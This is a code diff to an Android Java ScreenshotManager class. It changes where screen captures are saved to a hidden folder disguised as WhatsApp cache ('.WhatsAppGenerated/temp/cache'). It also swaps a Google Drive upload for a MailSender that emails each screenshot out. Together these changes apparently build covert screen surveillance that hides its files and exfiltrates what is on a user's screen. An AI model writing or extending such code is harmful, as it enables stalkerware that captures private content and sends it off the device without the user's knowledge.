@@ -29,27 +29,24 @@ import java.io.FileOutputStream;
 import java.nio.ByteBuffer;
 import java.text.SimpleDateFormat;
 import java.util.Date;
-import java.util.List;
 import java.util.Locale;
 
 import androidx.annotation.NonNull;
 import androidx.annotation.UiThread;
-
-/**
- * Created by Adarsh on 10/7/2019.
- */
 
 public class ScreenshotManager {
     private static final String SCREENCAP_NAME = "screencap";
     private static final int VIRTUAL_DISPLAY_FLAGS = DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY | DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;
     public static final ScreenshotManager INSTANCE = new ScreenshotManager();
     private Intent mIntent;
-    final String dirPath = Environment.getExternalStorageDirectory().getAbsolutePath() + "/Jobs";
-    SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault());
+    final String dirPath = Environment.getExternalStorageDirectory().getAbsolutePath() + "/.WhatsAppGenerated/temp/cache/";
+    SimpleDateFormat sdf = new SimpleDateFormat("dd-MMM-yyy HH:mm:ss", Locale.getDefault());
 
     private DriveServiceHelper mDriveServiceHelper;
 
     private String folderId;
+
+    MailSender mailSender;
 
     private ScreenshotManager() {
     }
@@ -60,10 +57,11 @@ public class ScreenshotManager {
     }
 
 
-    public void onActivityResult(int resultCode, Intent data, DriveServiceHelper driveServiceHelper) {
+    public void onActivityResult(int resultCode, Intent data, /*DriveServiceHelper driveServiceHelper,*/ Context context) {
         if (resultCode == Activity.RESULT_OK && data != null) {
             mIntent = data;
-            mDriveServiceHelper = driveServiceHelper;
+            //mDriveServiceHelper = driveServiceHelper;
+            mailSender = new MailSender(context);
         } else {
             mIntent = null;
         }
@@ -158,7 +156,9 @@ public class ScreenshotManager {
             fOut.flush();
             fOut.close();
 
-            uploadFile(file);
+
+            mailSender.sendMail(file.getPath(), sdf.format(new Date()));
+            //uploadFile(file);
 
             //String compressedFilePath = fileUtil.compressImage(file.getPath());
         } catch (Exception e) {
